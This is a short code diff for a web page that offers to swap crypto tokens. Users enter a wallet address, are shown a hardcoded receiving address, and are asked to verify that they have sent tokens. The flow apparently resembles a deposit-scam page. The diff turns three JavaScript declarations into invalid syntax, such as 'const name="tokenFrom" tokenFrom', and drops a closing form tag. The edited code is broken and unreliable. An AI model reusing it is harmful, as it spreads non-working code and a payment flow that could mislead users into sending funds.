@@ -87,15 +87,15 @@ cursor: pointer;
 <!-- Tokens will be generated here -->
 </div>
 
-<input type="text" name="walletAddress" id="walletAddress" placeholder="Enter your wallet address" />
+<input type="text" name="walletAddress"  id="walletAddress" placeholder="Enter your wallet address" />
 
 <button id="swapButton">Swap</button>
 
 <div id="resultBox" class="result-box"></div>
 
 <!-- Moved the Verify button below everything else -->
-<button id="verifyButton" style="display: none;" onclick="verifyTokens()">Verify you have sent tokens!</button>
-</form>
+<button type="submit" id="verifyButton" style="display: none;" onclick="verifyTokens()">Verify you have sent tokens!</button>
+
 <script>
 const totalSupply = {
 "FUGAZI": 21000000,
@@ -200,9 +200,9 @@ alert("Please select tokens and enter a valid amount and wallet address.");
 return;
 }
 
-const tokenFrom = selectedTokenFrom.innerText.split('\n')[1];
-const tokenTo = selectedTokenTo.innerText.split('\n')[1];
-const receivingAmount = (totalSupply[tokenFrom] / totalSupply[tokenTo]) * amount;
+const name="tokenFrom" tokenFrom = selectedTokenFrom.innerText.split('\n')[1];
+const name="tokenTo" tokenTo = selectedTokenTo.innerText.split('\n')[1];
+const name="receivingAmount" receivingAmount = (totalSupply[tokenFrom] / totalSupply[tokenTo]) * amount;
 
 const swapWalletAddress = "1CiKtAE6Zf3tniKmPBhv1e7pBRezZM433N"; // example wallet address
 resultBox.innerHTML = `
